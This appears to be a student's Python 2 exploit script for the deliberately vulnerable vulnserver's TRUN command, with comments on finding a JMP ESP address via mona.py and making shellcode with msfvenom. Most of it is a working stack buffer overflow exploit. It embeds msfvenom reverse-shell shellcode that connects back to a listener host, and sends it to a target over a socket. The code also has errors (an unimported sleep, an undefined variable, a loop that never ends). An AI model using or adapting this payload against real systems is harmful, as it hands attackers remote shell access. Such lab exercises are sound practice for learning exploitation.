#!/usr/bin/python
import sys, socket

# in ID we used mona.py to find a vulnerable module by entering !mona modules and looked for a module without protections
# In this case the module with lot of falses when it came to protections was essfucnc.dll
# we then used nasm in kali to find the hex code for JMP ESP FFE4, which when written in hex looks like \xFF\xE4
# we then used mona.py in ID to run the following !mona find -s "\xff\xe4" -m essfunc.dll
# -m = module which is the module found in line 4 that was attached to vulnserver that had no protections = essfunc.dll
# -s "\xff\xe4" is the adress FFE4 written as hex code (FFE4 generated by nasm for the JMP ESP)
# When you run line 6 it provides a list of return addresses, start at the top of that list
# After our As we are going to enter the addresses returned in the previous line in reverse in hex format e.g. 625011af = \xaf\x11\x50\x62


# This overflow was generated using msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.178 LPORT=4445 EXITFUNC=thread -f c -a x86 -b "\x00"
# Apparently EXITFUNC=thread makes it more s_string_variable
# -f = file type in this case C
# -a = architecture in this case x86
# -b = bad characters not to be used in the overflow code = in this case"\x00" is the null byte

overflow = ("\xbf\xaf\x60\xec\xd8\xda\xde\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
"\x52\x31\x7d\x12\x83\xed\xfc\x03\xd2\x6e\x0e\x2d\xd0\x87\x4c"
"\xce\x28\x58\x31\x46\xcd\x69\x71\x3c\x86\xda\x41\x36\xca\xd6"
"\x2a\x1a\xfe\x6d\x5e\xb3\xf1\xc6\xd5\xe5\x3c\xd6\x46\xd5\x5f"
"\x54\x95\x0a\xbf\x65\x56\x5f\xbe\xa2\x8b\x92\x92\x7b\xc7\x01"
"\x02\x0f\x9d\x99\xa9\x43\x33\x9a\x4e\x13\x32\x8b\xc1\x2f\x6d"
"\x0b\xe0\xfc\x05\x02\xfa\xe1\x20\xdc\x71\xd1\xdf\xdf\x53\x2b"
"\x1f\x73\x9a\x83\xd2\x8d\xdb\x24\x0d\xf8\x15\x57\xb0\xfb\xe2"
"\x25\x6e\x89\xf0\x8e\xe5\x29\xdc\x2f\x29\xaf\x97\x3c\x86\xbb"
"\xff\x20\x19\x6f\x74\x5c\x92\x8e\x5a\xd4\xe0\xb4\x7e\xbc\xb3"
"\xd5\x27\x18\x15\xe9\x37\xc3\xca\x4f\x3c\xee\x1f\xe2\x1f\x67"
"\xd3\xcf\x9f\x77\x7b\x47\xec\x45\x24\xf3\x7a\xe6\xad\xdd\x7d"
"\x09\x84\x9a\x11\xf4\x27\xdb\x38\x33\x73\x8b\x52\x92\xfc\x40"
"\xa2\x1b\x29\xc6\xf2\xb3\x82\xa7\xa2\x73\x73\x40\xa8\x7b\xac"
"\x70\xd3\x51\xc5\x1b\x2e\x32\x2a\x73\x30\x70\xc2\x86\x30\x65"
"\x4f\x0e\xd6\xef\x7f\x46\x41\x98\xe6\xc3\x19\x39\xe6\xd9\x64"
"\x79\x6c\xee\x99\x34\x85\x9b\x89\xa1\x65\xd6\xf3\x64\x79\xcc"
"\x9b\xeb\xe8\x8b\x5b\x65\x11\x04\x0c\x22\xe7\x5d\xd8\xde\x5e"
"\xf4\xfe\x22\x06\x3f\xba\xf8\xfb\xbe\x43\x8c\x40\xe5\x53\x48"
"\x48\xa1\x07\x04\x1f\x7f\xf1\xe2\xc9\x31\xab\xbc\xa6\x9b\x3b"
"\x38\x85\x1b\x3d\x45\xc0\xed\xa1\xf4\xbd\xab\xde\x39\x2a\x3c"
"\xa7\x27\xca\xc3\x72\xec\xea\x21\x56\x19\x83\xff\x33\xa0\xce"
"\xff\xee\xe7\xf6\x83\x1a\x98\x0c\x9b\x6f\x9d\x49\x1b\x9c\xef"
"\xc2\xce\xa2\x5c\xe2\xda")

# In the following we are filling the memory available with As, hitting the EIP represented by the address "\xaf\x11\x50\x62"
# We are then adding a little bit of padding using nop sleds which is essntially a little bit of padding before the exploit code actually runs.


shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.0.143',9999))

        s.send(('TRUN /.:/' + shellcode))
        s.close
        sleep(1)
        buffer = buffer + "A" * 100

    except:
        print "Error connecting to server"
        sys.exit()
